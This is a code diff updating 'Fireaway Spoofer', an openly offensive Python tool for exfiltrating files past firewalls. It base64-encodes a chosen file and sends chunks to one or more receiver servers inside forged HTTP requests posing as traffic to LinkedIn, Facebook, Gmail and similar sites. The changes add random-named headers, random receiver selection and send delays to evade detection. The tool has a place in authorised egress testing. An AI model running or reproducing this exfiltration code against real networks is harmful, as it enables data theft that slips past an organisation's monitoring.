@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-#Fireaway Spoofer Copyright 2016 Russell Butturini
+#Fireaway Spoofer Copyright 2017 Russell Butturini
 #This program is free software: you can redistribute it and/or modify
 # it under the terms of the GNU General Public License as published by
 #the Free Software Foundation, either version 3 of the License, or
@@ -17,6 +17,8 @@
 import socket
 import sys
 import string
+import base64
+from time import sleep
 from random import choice
 from random import randint
 
@@ -26,15 +28,22 @@ def main():
         printHelp()
 
     else:
+        if sys.argv[1].count('.') != 3:  # If there aren't 3 dots, assume it's a file name (yes, this is lame)
+            with open(sys.argv[1]) as f:
+                serverList = f.readlines()
+
+        else: # An IP address (or something that looks like an IP address) is in the file name argument
+            serverList = sys.argv[1]
+
         if sys.argv[3] == '0':
-            testChunk(sys.argv[1], int(sys.argv[2]))
+            testChunk(serverList, int(sys.argv[2]))
 
         elif sys.argv[3] == '1':
-            sendFile(sys.argv[1], int(sys.argv[2]))
+            sendFile(serverList, int(sys.argv[2]))
 
 
 def testChunk(server, port):
-    apps = ['www.linkedin.com','www.facebook.com','www.gmail.com','www.youtube.com', 'www.dropbox.com']
+    apps = ['www.linkedin.com','www.facebook.com','www.gmail.com','www.youtube.com', 'www.dropbox.com', 'www.google.com', 'www.icloud.com']
 
     while True:
         try:
@@ -71,12 +80,22 @@ def testChunk(server, port):
             if coverDNS.lower == 'y':
                 socket.gethostbyname(spoofedApp)
 
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
-            s.connect((server, port))
-            print 'sending ' + str(curBytes) + ' bytes of test data disguised as ' + spoofedApp.split('.')[1] +   '.  Watch the server to see how much is received.'
-            s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent:Mozilla/5.0 (Windows NT 6.1)\nConnection:close\n\n' + testData)
-            s.close()
+
+            if type(server) is str:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(15)
+                s.connect((server, port))
+                print 'sending ' + str(curBytes) + ' bytes of test data disguised as ' + spoofedApp.split('.')[1] +   '.  Watch the server to see how much is received.'
+                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent: Mozilla/5.0 (Windows NT 6.1)\n' + genRandHeader() + ': ' + testData + '\n' + 'Connection: close\n\n')
+                s.close()
+
+            elif type(server) is list:  # Multiple servers in play
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(15)
+                receiver = server[randint(0, len(server) - 1)]
+                s.connect((receiver, port))
+                print 'sending ' + str(curBytes) + ' bytes of test data disguised as ' + spoofedApp.split('.')[1] +  'to' + receiver + '.  Watch the server to see how much is received.'
+                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent: Mozilla/5.0 (Windows NT 6.1)\n' + genRandHeader() + ': ' + testData + '\n' + 'Connection: close\n\n')
 
         except Exception,e:
             # Handle aggressive network traffic from the firewall gracefully and keep going.
@@ -91,6 +110,11 @@ def testChunk(server, port):
     else:
         sys.exit()
 
+def genRandHeader():
+    chars = string.ascii_letters
+    length = randint(5,20)
+    return ''.join(choice(chars) for x in range(length)) + ': '
+
 def sendFile(server, port):
     sourceFile = raw_input('Enter filename to exfiltrate: ')
     pieceSize = int(raw_input('Enter chunk size to send (be sure to account for app spoofing size): '))
@@ -99,39 +123,58 @@ def sendFile(server, port):
     chunkCount = 1
 
     with open (sourceFile,'rb') as f:
-        while True:
-            piece = f.read(pieceSize)
+        unencodedWhole = f.read()
 
-            if piece == "":
-                break  # EOF
+    unsent = base64.b64encode(unencodedWhole)
 
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(15)
+    while True:
+        piece = unsent[0:pieceSize]
 
-            try:
-                spoofedApp = apps[randint(0,len(apps)-1)]
+        if piece == "":
+            break  # EOF
 
-                if coverDNS.lower() == 'y':
-                    socket.gethostbyname(spoofedApp)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(15)
 
+        try:
+            spoofedApp = apps[randint(0,len(apps)-1)]
+
+            if coverDNS.lower() == 'y':
+                socket.gethostbyname(spoofedApp)
+
+
+            if type(server) is str:
                 s.connect((server, port))
                 print 'Sending chunk ' + str(chunkCount) + ' spoofed as ' + spoofedApp.split('.')[1]
-                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent:Mozilla/5.0 (Windows NT 6.1)\nConnection:close\n\n' + piece)
+                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent: Mozilla/5.0 (Windows NT 6.1)\n' + genRandHeader() + ': ' + piece + '\n' + 'Connection: close\n\n')
                 s.close()
                 chunkCount += 1
+                sleep(3)
 
-            except:
-                # Handle aggressive network traffic from the firewall and keep going
-                print 'Got something bad back.  Going to plug on...'
-                pass
+            elif type(server) is list:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(15)
+                receiver = server[randint(0, len(server) - 1)]
+                s.connect((receiver, port))
+                print 'Sending chunk ' + str(chunkCount) + ' spoofed as ' + spoofedApp.split('.')[1] + ' to ' + receiver
+                s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent: Mozilla/5.0 (Windows NT 6.1)\n' + genRandHeader() +  piece + '\n' + 'Connection: close\n\n')
+                s.close()
+                chunkCount += 1
+                sleep(3)
+
+        except:
+            # Handle aggressive network traffic from the firewall and keep going
+            print 'Got something bad back.  Going to plug on...'
+            pass
+        unsent = unsent[pieceSize:]
 
     print 'Finished sending file.  Check ReceivedData.txt on the server for results.'
     
 
 
 def printHelp():
-    print 'Fireaway App Spoofer and Exfil v0.1'
-    print 'Usage:  fa_spoof <fa_server IP> <port> <mode>'
+    print 'Fireaway App Spoofer and Exfil v0.2'
+    print 'Usage:  fa_spoof <fa_server IP or path to server list> <port> <mode>'
     print 'Valid options for mode:'
     print '0-Send random test data to find maximum leaked data fragment size'
     print '1-Open a file for exfiltration'
